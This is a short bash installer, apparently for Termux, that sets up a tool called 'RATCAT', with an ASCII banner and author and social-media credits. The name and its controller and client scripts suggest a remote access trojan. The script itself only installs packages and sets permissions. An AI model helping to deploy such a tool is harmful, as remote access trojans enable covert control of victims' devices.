

```bash
#!/bin/bash

# RATCAT Installer
# Developed by: zaax

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                                                           ║"
echo "║   ██████╗  █████╗ ████████╗ ██████╗ █████╗ ████████╗    ║"
echo "║   ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝    ║"
echo "║   ██████╔╝███████║   ██║   ██║     ███████║   ██║       ║"
echo "║   ██╔══██╗██╔══██║   ██║   ██║     ██╔══██║   ██║       ║"
echo "║   ██║  ██║██║  ██║   ██║   ╚██████╗██║  ██║   ██║       ║"
echo "║   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝       ║"
echo "║                                                           ║"
echo "║            RATCAT INSTALLER v2.0                          ║"
echo "║            Developed by: zaax                             ║"
echo "║            TikTok: @promptbyzaax__                        ║"
echo "╚═══════════════════════════════════════════════════════════╝"

echo ""
echo "[*] Installing RATCAT..."

# Update packages
echo "[*] Updating packages..."
pkg update -y && pkg upgrade -y

# Install Python
echo "[*] Installing Python..."
pkg install python python-pip -y

# Install dependencies
echo "[*] Installing dependencies..."
pip install -r requirements.txt

# Create directories
echo "[*] Creating directories..."
mkdir -p logs
mkdir -p web

# Set permissions
echo "[*] Setting permissions..."
chmod +x controller/main.py
chmod +x client/ratcat_client.py

echo ""
echo "[✓] RATCAT installed successfully!"
echo ""
echo "To start: python controller/main.py"
echo ""
echo "Developed by: zaax"
echo "TikTok: @promptbyzaax__"
